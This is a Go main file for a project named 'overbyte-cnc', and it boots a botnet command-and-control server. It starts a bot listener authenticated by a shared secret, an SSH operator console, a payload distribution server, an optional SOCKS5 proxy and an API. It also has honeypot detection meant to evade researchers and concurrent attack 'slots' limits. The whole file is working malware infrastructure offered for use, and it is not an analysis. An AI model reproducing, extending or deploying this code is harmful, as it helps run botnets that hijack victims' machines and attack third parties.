package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"overbyte-cnc/api"
	"overbyte-cnc/bot"
	cncserver "overbyte-cnc/cnc"
	"overbyte-cnc/config"
	"overbyte-cnc/crypto"
	"overbyte-cnc/database"
	"overbyte-cnc/logger"
	"overbyte-cnc/payload"
	"overbyte-cnc/proxy"
	"overbyte-cnc/theme"
	"overbyte-cnc/ui"
)

func main() {
	cfg, err := config.Load("config/config.json")
	if err != nil {
		fmt.Printf("Failed to load config: %v\n", err)
		os.Exit(1)
	}
	if err := cfg.Validate(); err != nil {
		fmt.Printf("Config validation failed: %v\n", err)
		os.Exit(1)
	}

	if err := logger.Init(cfg.Logging); err != nil {
		fmt.Fprintf(os.Stderr, "Failed to initialize logger: %v\n", err)
		os.Exit(1)
	}
	defer logger.Close()

	if err := crypto.InitMasterKey(); err != nil {
		fmt.Printf("Failed to initialize crypto: %v\n", err)
		os.Exit(1)
	}

	logger.Info("Starting CNC Server...")

	var db *database.Database
	for attempt := 1; attempt <= 3; attempt++ {
		var err error
		db, err = database.New(
			cfg.Database.Host,
			cfg.Database.Port,
			cfg.Database.User,
			cfg.Database.Password,
			cfg.Database.Name,
		)
		if err == nil {
			break
		}
		logger.Error("Failed to connect to database (attempt %d/3): %v", attempt, err)
		if attempt == 3 {
			logger.Error("Could not connect to database after 3 attempts, exiting")
			os.Exit(1)
		}
		time.Sleep(time.Duration(attempt*2) * time.Second)
	}
	defer db.Close()

	logger.Info("Connected to database")

	if err := db.InitTables(); err != nil {
		logger.Error("Failed to initialize tables: %v", err)
		os.Exit(1)
	}

	userCount, err := db.UserCount()
	if err != nil {
		logger.Error("Failed to check user count: %v", err)
		os.Exit(1)
	}

	if userCount == 0 {
		password, apiKey, err := db.CreateRootUser(cfg.RootUsername)
		if err != nil {
			logger.Error("Failed to create root user: %v", err)
			os.Exit(1)
		}

		t := theme.Current()
		fmt.Println("")
		fmt.Println(t.Succ("[*] Root user created"))
		fmt.Println(t.LabelValue("    Username", cfg.RootUsername))
		fmt.Println(t.LabelValue("    Password", t.Err(password)))
		fmt.Println(t.LabelValue("    API Key", t.Inf(apiKey)))
		fmt.Println(t.Err("    SAVE THIS! It will only be shown ONCE."))
		fmt.Println("")

		logger.Info("Root user '%s' created", cfg.RootUsername)
	}

	uiManager, err := ui.New(".")
	if err != nil {
		logger.Warn("UI manager initialization: %v (using defaults)", err)
	}

	if _, err := theme.Load("config/theme.json"); err != nil {
		logger.Warn("Theme loading: %v (using defaults)", err)
	}

	botManager := bot.NewManager(cfg.GetPingInterval(), cfg.GetPingTimeout())

	firewall, err := bot.NewFirewallManager(
		cfg.Security.FirewallEnabled,
		cfg.CNC.BotPort,
		cfg.Security.FirewallPersistFile,
	)
	if err != nil {
		logger.Warn("Firewall manager initialization failed: %v (continuing without firewall)", err)
	}
	if firewall != nil && firewall.IsEnabled() {
		logger.Info("Firewall blocking: enabled (nftables)")
	}

	detection := bot.NewDetectionSystem(
		cfg.Security.HoneypotDetection,
		cfg.Security.SuspicionThreshold,
		cfg.Security.BlacklistDuration,
		firewall,
	)
	logger.Info("Honeypot detection: enabled=%v, threshold=%.1f", cfg.Security.HoneypotDetection, cfg.Security.SuspicionThreshold)

	dedup := bot.NewDeduplicationSystem(
		cfg.Security.PreventDuplicates,
		cfg.Security.ReplaceOldConnection,
	)
	logger.Info("Duplicate prevention: enabled=%v, replace_old=%v", cfg.Security.PreventDuplicates, cfg.Security.ReplaceOldConnection)

	botHandler := bot.NewHandler(botManager, cfg.CNC.BotPort, cfg.CNC.BotSecret, detection, dedup)
	if err := botHandler.Start(); err != nil {
		logger.Error("Failed to start bot handler: %v", err)
		os.Exit(1)
	}

	sshServer := cncserver.NewServer(cfg.CNC.SSHPort, cfg.CNC.SSHHostKey, db, botManager, uiManager, cfg)
	if err := sshServer.Start(); err != nil {
		logger.Error("Failed to start SSH server: %v", err)
		os.Exit(1)
	}

	var proxyServer *proxy.SOCKS5Server
	if cfg.Proxy.Enabled {
		proxyCfg := proxy.SOCKS5Config{
			Enabled:      cfg.Proxy.Enabled,
			BindAddr:     cfg.Proxy.BindAddr,
			BindPort:     cfg.Proxy.BindPort,
			TargetPort:   cfg.CNC.SSHPort,
			AuthEnabled:  cfg.Proxy.AuthEnabled,
			AuthUsername: cfg.Proxy.AuthUsername,
			AuthPassword: cfg.Proxy.AuthPassword,
		}
		proxyServer = proxy.NewSOCKS5Server(proxyCfg)
		if err := proxyServer.Start(); err != nil {
			logger.Error("Failed to start SOCKS5 proxy: %v", err)
			os.Exit(1)
		}
	}

	var apiServer *api.APIServer
	if cfg.API.Enabled {
		apiServer = api.NewServer(db, botManager, cfg)
		if err := apiServer.Start(); err != nil {
			logger.Error("Failed to start API server: %v", err)
			os.Exit(1)
		}
	}

	var payloadServer *payload.Server
	if cfg.Payload.Enabled {
		payloadServer = payload.NewServer(cfg)
		if err := payloadServer.Start(); err != nil {
			logger.Error("Failed to start payload server: %v", err)
			os.Exit(1)
		}
	}

	t := theme.Current()
	fmt.Println("")
	if cfg.API.Enabled {
		fmt.Printf("%s | Bot: %s | SSH: %s | API: %s | Slots: %s\n",
			t.Succ("[*] CNC Started"), t.Inf(fmt.Sprintf("%d", cfg.CNC.BotPort)), t.Inf(fmt.Sprintf("%d", cfg.CNC.SSHPort)), t.Inf(fmt.Sprintf("%d", cfg.API.Port)), t.Inf(fmt.Sprintf("%d", cfg.CNC.MaxGlobalSlots)))
		logger.Info("CNC Server started - Bot:%d SSH:%d API:%d", cfg.CNC.BotPort, cfg.CNC.SSHPort, cfg.API.Port)
	} else if cfg.Proxy.Enabled {
		fmt.Printf("%s | Bot: %s | SSH: %s | Proxy: %s | Sessions: %s\n",
			t.Succ("[*] CNC Started"), t.Inf(fmt.Sprintf("%d", cfg.CNC.BotPort)), t.Inf(fmt.Sprintf("%d", cfg.CNC.SSHPort)), t.Inf(fmt.Sprintf("%d", cfg.Proxy.BindPort)), t.Inf(fmt.Sprintf("%d", cfg.CNC.MaxSessions)))
		logger.Info("CNC Server started - Bot:%d SSH:%d Proxy:%d", cfg.CNC.BotPort, cfg.CNC.SSHPort, cfg.Proxy.BindPort)
	} else {
		fmt.Printf("%s | Bot: %s | SSH: %s | Sessions: %s | Slots: %s\n",
			t.Succ("[*] CNC Started"), t.Inf(fmt.Sprintf("%d", cfg.CNC.BotPort)), t.Inf(fmt.Sprintf("%d", cfg.CNC.SSHPort)), t.Inf(fmt.Sprintf("%d", cfg.CNC.MaxSessions)), t.Inf(fmt.Sprintf("%d", cfg.CNC.MaxGlobalSlots)))
		logger.Info("CNC Server started - Bot:%d SSH:%d", cfg.CNC.BotPort, cfg.CNC.SSHPort)
	}
	fmt.Println("")

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan

	fmt.Println("")
	fmt.Println(theme.Current().Label("=== CNC Server Shutting Down ==="))
	logger.Info("CNC Server shutting down")

	if apiServer != nil {
		apiServer.Stop()
	}
	if payloadServer != nil {
		payloadServer.Stop()
	}
	if proxyServer != nil {
		proxyServer.Stop()
	}
	if firewall != nil {
		firewall.Shutdown()
	}
	botHandler.Stop()
	sshServer.Stop()

	// Allow a brief moment for connections to drain
	time.Sleep(2 * time.Second)
}
